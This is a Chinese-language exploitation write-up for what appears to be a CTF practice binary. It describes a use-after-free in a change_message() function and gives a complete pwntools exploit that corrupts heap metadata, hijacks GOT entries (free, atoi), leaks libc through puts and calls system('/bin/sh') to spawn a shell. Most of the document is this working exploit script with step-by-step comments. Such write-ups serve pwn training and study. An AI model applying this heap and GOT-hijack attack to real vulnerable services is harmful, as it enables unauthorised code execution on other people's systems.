# 漏洞利用文档

## 执行环境
- **程序类型**: 64位ELF二进制程序，使用动态链接的libc
- **保护机制**: 
  - Partial RELRO: GOT表可写，允许GOT劫持
  - No PIE: 代码段和數據段地址固定，便于计算偏移
  - 可能开启ASLR，但通过泄露libc地址绕过
- **依赖环境**: 
  - 需要libc库，exp中使用`elf.libc`自动匹配
  - 使用pwntools开发，运行在Linux系统下
- **关键函数**: 
  - `change_message()`: 存在UAF漏洞的主要触发点
  - `edit()`: 用于覆盖内存内容
  - `delete()`: 触发free操作

## 漏洞成因
- **漏洞类型**: Use-After-Free (UAF) 结合堆元数据破坏
- **关键结构体**:
  - 全局变量:
    - `name`: 0x20字节缓冲区，位于BSS段0x6020a0
    - `message`: 指针，指向堆分配的chunk
    - `page_list`: 8个指针的数组，管理页面chunk
    - `size_list`: 8个整数的数组，记录页面大小
- **漏洞触发点**:
  - 在`change_message()`函数中:
    ```c
    free(message);  // 释放原message chunk
    // ... 分配新message chunk ...
    read(0, message, 0x10u);  // UAF: 继续使用已释放的message指针写入数据
    ```
  - 这导致已free的chunk元数据被覆盖，破坏堆完整性，进而实现任意地址写

## 漏洞利用过程
### 内存变化时序表
| 步骤 | 操作 | 堆状态变化 | 关键内存修改 |
|------|------|------------|-------------|
| 1 | 初始化+添加页面0 | 分配message chunk(0xc1) + page0 chunk(0xd1) | 建立初始堆布局 |
| 2 | change_message | free原message chunk，分配新message chunk | 泄露堆地址，覆盖free chunk的fd/bk指针 |
| 3 | change_name | - | 在name变量构建指针链，指向GOT和堆 |
| 4 | 添加页面1、2 | 通过堆风水控制分配位置 | page_list部分指向受控地址 |
| 5 | 编辑页面2 | - | 覆盖page_list指向GOT表(free/puts/atoi) |
| 6 | 编辑页面0 | - | 修改free GOT指向init函数(0x4006a0) |
| 7 | 删除页面1 | 触发free操作 | 通过堆布局泄露libc地址 |
| 8 | 接收泄露地址 | - | 获取puts函数地址，计算libc基址 |
| 9 | 编辑页面2 | - | 修改atoi GOT指向system函数 |
| 10 | 发送"/bin/sh" | - | 触发atoi调用，实际执行system("/bin/sh") |
| 11 | interactive | 进程替换为/bin/dash | 获得shell权限 |

### 堆布局演变
```
初始状态: [message_chunk] [page0_chunk] [top_chunk]
步骤2后: [free_message] [page0_chunk] [new_message] [top_chunk]
步骤4后: [free_message] [page0_chunk] [new_message] [page1_chunk] [page2_chunk] [top_chunk]
最终状态: /bin/dash进程完全替换原进程内存布局
```

## Exploit
```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 加载二进制文件和libc
elf = ELF('./data/sample26')
libc = elf.libc
p = process("./data/sample26")

# 获取GOT表地址
free_got = elf.got['free']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']

def add(size):
    p.sendline(b'1')
    p.sendafter(b'size:\n', str(size).encode('utf-8'))

def dele(idx):
    p.sendline(b'3')
    p.send(str(idx).encode('utf-8'))

def edit(idx, context):
    p.sendline(b'2')
    p.sendline(str(idx).encode('utf-8'))
    p.send(context)

def change_name(name):
    p.sendline(b'4')
    p.send(name)

def change_mesg(size, new_mesg, mesg):
    p.sendline(b'5')
    p.recvuntil(b'saved at ')
    a = p.recvline()[:-1]
    print('leak--->', a)
    heap_addr = int(a, 16)
    # 构造payload覆盖free chunk的fd指针
    payload = p64(heap_addr + 0xb0 + 0xd0)
    mesg = payload + mesg
    print('---->', hex(heap_addr))
    p.send(str(size).encode('utf-8'))
    p.send(new_mesg)
    p.send(mesg)
    return a

# Step 1: 初始化程序，设置name和message，添加第一个页面
p.sendlineafter(b'writer:\n', b'a')
p.sendlineafter(b'book?\n', b'a')
add(0xC8)  # 分配大小为0xC8的页面

# Step 2: 触发UAF漏洞，泄露堆地址，覆盖free chunk元数据
payload = p64(0x6020A0 - 0x10)  # 指向name变量附近，构造fake chunk
heap_addr = change_mesg(200, b'11', payload)
heap_addr = int(heap_addr, 16)

# Step 3: 修改name变量，构建复杂的指针链
payload = p64(heap_addr - 0x10) + p64(0x6020A0 + 0x8) + p64(0) + p64(0x6020A0 - 0x10)
change_name(payload)

# Step 4: 添加两个新页面，通过堆布局控制分配
add(0xb0)
add(0xb0)

# Step 5: 编辑页面2，覆盖page_list指向GOT表
payload = b'a' * 0x40 + p64(heap_addr + 0xb0 + 0xc0 + 0xd0) + b'a' * 0x18
payload += p64(free_got) + p64(puts_got) + p64(atoi_got)
edit(2, payload)

# Step 6: 编辑页面0（实际指向free GOT），将其覆盖为init函数地址
edit(0, p64(0x4006A0))

# Step 7: 删除页面1，触发free操作，通过堆布局泄露libc地址
dele(1)

# Step 8: 接收泄露的puts函数地址
p.recvuntil(b'delete?\n')
puts_addr = p.recvline()[:-1]

# Step 9: 计算system地址，修改atoi GOT指向system
puts_addr = int.from_bytes(puts_addr, 'little')
libc_addr = puts_addr - libc.symbols['puts']
system_addr = libc_addr + libc.symbols['system']
edit(2, p64(system_addr))  # 修改atoi GOT为system

# Step 10: 发送"/bin/sh"字符串，触发atoi调用（实际执行system("/bin/sh")）
p.send(b'/bin/sh\x00')

# Step 11: 获得shell交互
p.interactive()
```

### 关键注释说明
- **步骤2**: 利用`change_message()`中的UAF漏洞，在free后继续写入，覆盖free chunk的fd/bk指针，构造恶意smallbin链
- **步骤3**: 在name变量中构建自引用指针链，为后续任意地址写做准备
- **步骤5**: 通过污染的page_list，将页面指针重定向到GOT表，实现GOT劫持准备
- **步骤6**: 将free GOT覆盖为init函数地址，作为控制流劫持的跳板
- **步骤8**: 通过堆布局和GOT覆盖，在delete操作中泄露libc地址
- **步骤9**: 计算system函数地址并覆盖atoi GOT，为代码执行做准备
- **步骤10**: 触发atoi调用（实际执行system），获得shell权限

此exp成功利用了UAF漏洞，通过堆元数据破坏和GOT劫持，最终实现了任意代码执行。
